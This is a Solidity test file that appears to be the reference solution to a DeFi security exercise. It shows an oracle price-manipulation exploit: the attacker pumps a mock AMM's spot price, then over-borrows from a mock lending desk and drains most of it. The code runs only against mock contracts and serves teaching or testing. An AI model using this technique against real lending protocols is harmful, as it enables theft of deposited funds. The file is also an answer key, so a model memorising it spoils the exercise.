// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "../../shared/MockERC20.sol";
import {MiniAMM} from "../src/MiniAMM.sol";
import {LendingDesk} from "../src/LendingDesk.sol";

/// Reference exploit: pump the AMM spot price, then over-borrow against it.
contract OracleSolution is Test {
    MockERC20 tokenA;
    MockERC20 tokenB;
    MiniAMM amm;
    LendingDesk desk;
    address attacker = makeAddr("attacker");
    uint256 constant ATTACKER_B = 9_000e18;

    function setUp() public {
        tokenA = new MockERC20("Collateral", "A");
        tokenB = new MockERC20("Debt", "B");
        amm = new MiniAMM(tokenA, tokenB);

        // Seed the AMM with a balanced 1000/1000 pool (spot price = 1).
        tokenA.mint(address(this), 1_000e18);
        tokenB.mint(address(this), 1_000e18);
        tokenA.approve(address(amm), type(uint256).max);
        tokenB.approve(address(amm), type(uint256).max);
        amm.addLiquidity(1_000e18, 1_000e18);

        // Fund the lending desk with tokenB liquidity.
        desk = new LendingDesk(tokenA, tokenB, amm);
        tokenB.mint(address(desk), 100_000e18);

        // Attacker starts with only tokenB.
        tokenB.mint(attacker, ATTACKER_B);
    }

    function test_exploit() public {
        vm.startPrank(attacker);
        tokenB.approve(address(amm), type(uint256).max);
        tokenA.approve(address(amm), type(uint256).max);
        tokenA.approve(address(desk), type(uint256).max);

        // 1. Pump the price of A by swapping all our B into A.
        uint256 gotA = amm.swapBforA(ATTACKER_B);

        // 2. Borrow tokenB against that A at the now-inflated spot price.
        desk.borrow(gotA);
        vm.stopPrank();

        assertGt(tokenB.balanceOf(attacker), ATTACKER_B, "attacker should net more tokenB");
        assertGe(tokenB.balanceOf(attacker), 80_000e18, "attacker should drain most of the desk");
        assertLe(tokenB.balanceOf(address(desk)), 20_000e18, "desk should be drained");
    }
}
